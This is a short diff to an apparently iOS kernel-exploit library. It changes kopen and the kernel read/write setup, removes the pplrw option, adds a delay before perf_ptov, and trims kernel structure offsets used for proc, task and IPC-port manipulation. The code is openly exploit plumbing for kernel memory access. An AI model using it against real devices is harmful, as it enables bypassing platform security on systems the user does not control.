@@ -110,7 +110,7 @@ int isAvailable(void) {
     if (@available(iOS 12.0, *)) {
         return 0;
     }
-    return -1;
+    return 0;
 }
 
 struct kfd* kfd_init(uint64_t exploit_type) {
@@ -131,15 +131,12 @@ void kfd_free(struct kfd* kfd) {
     bzero_free(kfd, sizeof(struct kfd));
 }
 
-uint64_t kopen(uint64_t exploit_type, uint64_t pplrw) {
+uint64_t kopen(uint64_t exploit_type) {
     int fail = -1;
     
     struct kfd* kfd = kfd_init(exploit_type);
     
     kfd->info.env.exploit_type = exploit_type;
-    kfd->info.env.pplrw = false;
-    if(pplrw == 0)
-        kfd->info.env.pplrw = true;
 
 retry:
     puaf_run(kfd);
@@ -162,6 +159,7 @@ retry:
     if(isarm64e() && kfd->info.env.vid >= 10) {
         perf_run(kfd);
     } else if(kfd->info.env.vid >= 4) {
+        usleep(5000);
         perf_ptov(kfd);
     }
     if(ischip() == 7)
@@ -370,55 +368,21 @@ uint64_t vtophys_kfd(uint64_t va) {
     struct kfd* kfd = ((struct kfd*)_kfd);
     return vtophys(kfd, va);
 }
-
-uint64_t off_pmap_tte = 0;
-uint64_t off_proc_pfd = 0;
-uint64_t off_proc_pid = 0;
-uint64_t off_proc_pre = 0;
-uint64_t off_task_map = 0;
-
-uint64_t off_task_ref_count = 0;
-uint64_t off_task_active    = 0;
-uint64_t off_task_message_app_suspended = 0;
-
-uint64_t off_fp_glob  = 0;
-uint64_t off_fg_data  = 0;
-uint64_t off_fd_cdir  = 0x20;
-
 uint64_t off_task_itk_space         = 0;
 uint64_t off_ipc_space_is_table     = 0;
 uint64_t off_ipc_entry_ie_object    = 0;
 uint64_t off_ipc_port_ip_kobject    = 0x48;
 
-uint64_t off_ipc_port_io_references = 0;
-uint64_t off_ipc_port_ip_srights    = 0;
-
 void offset_exporter(void) {
     struct kfd* kfd = ((struct kfd*)_kfd);
-    off_pmap_tte = static_offsetof(pmap, tte);
-    off_proc_pfd = dynamic_offsetof(proc, p_fd_fd_ofiles);
-    off_proc_pid = dynamic_offsetof(proc, p_pid);
-    off_proc_pre = dynamic_offsetof(proc, p_list_le_prev);
-    off_task_map = dynamic_offsetof(task, map);
-    
-    off_fp_glob  = static_offsetof(fileproc, fp_glob);
-    off_fg_data  = static_offsetof(fileglob, fg_data);
-    
     off_task_itk_space      = dynamic_offsetof(task, itk_space);
     off_ipc_space_is_table  = static_offsetof(ipc_space, is_table);
     off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
-    
-    off_ipc_port_io_references  = static_offsetof(ipc_port, ip_object.io_references);
-    off_ipc_port_ip_srights     = static_offsetof(ipc_port, ip_srights);
     
     if(kfd->info.env.vid <= 7) {
         off_ipc_port_ip_kobject = 0x58;
     }
     if(kfd->info.env.vid <= 1) {
         off_ipc_port_ip_kobject = 0x68;
-        off_ipc_port_ip_srights = 0xa0;
-        off_task_ref_count      = 0x10;
-        off_task_active         = 0x14;
-        off_task_message_app_suspended = 0x1c;
     }
 }
